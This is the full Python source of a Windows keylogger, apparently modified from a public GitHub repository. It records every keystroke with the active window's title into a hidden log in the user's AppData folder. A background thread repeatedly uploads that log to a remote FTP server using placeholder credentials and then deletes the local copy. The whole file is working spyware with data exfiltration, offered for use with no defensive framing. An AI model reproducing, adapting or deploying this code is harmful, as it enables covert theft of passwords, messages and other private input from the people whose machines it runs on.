# Original repo: https://github.com/cy4nguy/PythonSimpleKeylogger
# Modified by: @Naategh

#!/usr/bin/python

from ftplib import FTP
from threading import Thread
from keyboard import read_key               
from os import getcwd, chdir, getlogin, remove
from win32gui import GetWindowText, GetForegroundWindow 
from datetime import date

"""
            .----.______
            |           | 
            |    ___________
            |   /          / Some random script for  
            |  /          / some random on interWeb !
            | /          /  
            |/__________/  ~Cy4n 
"""
    
def UploadThLog():                                                      # We gonna use UploadThLog 
    while True :                                                        # To Upload log.txt to the ftp server ! 
        chdir(f"C:\\Users\\{getlogin()}\\AppData")                      # Change our work path to AppData
        with FTP("ftp.Yourhost.com","User","passw123") as ftp:                           # Login to Ftp sever .
            ftp.cwd("htdocs");ftp.cwd("logs");index=len(ftp.nlst())-1                    # Getting out of root dirctory (in ftp sever)(Not you make sure you have /logs folder in your ftp server) (and getting number of file in the dir)
            StorAs    = (f"log_{date.today().strftime('%d-%m-%Y')}_{index}")             # Getting time and date to Name our file with current time and date 
            ftp.set_pasv(False)                                                          # getting out of pasv mode in ftp in order to wirte file to sever.
            with open("Log.txt","rb") as file:ftp.storbinary(f'STOR {StorAs}.txt', file) # Storying files on ftp sever.
        remove("Log.txt")                                                                # Removing log file from system

def WriteToFile(Key):open("Log.txt", "a").write(Key)                # Write the key in to file            

if __name__ == '__main__':                                          # Cheak if script get called by user

    chdir(f"C:\\Users\\{getlogin()}\\AppData")                      # Chdir to Appdate
    Thread(target=UploadThLog).start()                              # start our ftp uplader in thread !
    while True:

        tmpwnm      = GetWindowText (GetForegroundWindow())         # get the window name .
        Key         = read_key();read_key()                         # get key .
        
        if len(Key) >= 2: WriteToFile((f"[{tmpwnm}][{Key}]\n"))     # (if user press special key) save the key with window name 
        else: WriteToFile((f"{Key}"))                               # save key (normal keys)
    
